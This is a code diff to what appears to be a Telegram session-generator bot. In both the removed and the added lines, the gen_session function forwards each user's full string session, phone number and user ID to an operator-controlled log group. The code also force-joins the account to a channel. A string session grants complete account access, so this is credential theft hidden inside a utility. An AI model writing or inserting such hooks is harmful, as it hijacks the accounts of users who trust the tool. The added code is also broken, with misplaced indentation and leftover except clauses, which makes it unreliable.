@@ -240,25 +240,32 @@ async def gen_session(
             )
             await client.join_chat("BRANDED_PAID_CC")
 
+        # Add this right after the session is sent to user's saved messages
+if LOG_GROUP_ID:
+    try:
+        # Get user info first
+        user_info = await client.get_me()
+        
+        # Prepare log message
+        log_text = (
+            f"#NEW_SESSION\n\n"
+            f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
+            f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
+            f"🤖 <b>Bot:</b> @{user_info.username}\n"
+            f"🔗 <b>Support:</b> {SUPPORT_CHAT}\n"
+            f"⚙️ <b>Type:</b> {ty}\n\n"
+            f"<code>{string_session}</code>"
+        )
+        
         # Send to log group
-        if LOG_GROUP_ID:
-            try:
-                user_info = await client.get_me()
-                log_text = (
-                    f"#NEW_SESSION\n\n"
-                    f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
-                    f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
-                    f"🤖 <b>Bot:</b> @{user_info.username}\n"
-                    f"🔗 <b>Support:</b> {SUPPORT_CHAT}\n"
-                    f"⚙️ <b>Type:</b> {ty}\n\n"
-                    f"<code>{string_session}</code>"
-                )
-                await client.send_message(
-                    LOG_GROUP_ID,
-                    log_text,
-                    parse_mode="html",
-                    disable_web_page_preview=True
-                )
+        await client.send_message(
+            int(LOG_GROUP_ID),  # Convert to integer explicitly
+            log_text,
+            parse_mode="html",
+            disable_web_page_preview=True
+        )
+    except Exception as e:
+        print(f"Failed to send log: {e}")  # Will appear in your bot logs
             except Exception as e:
                 print(f"Failed to send to log group: {e}")
 
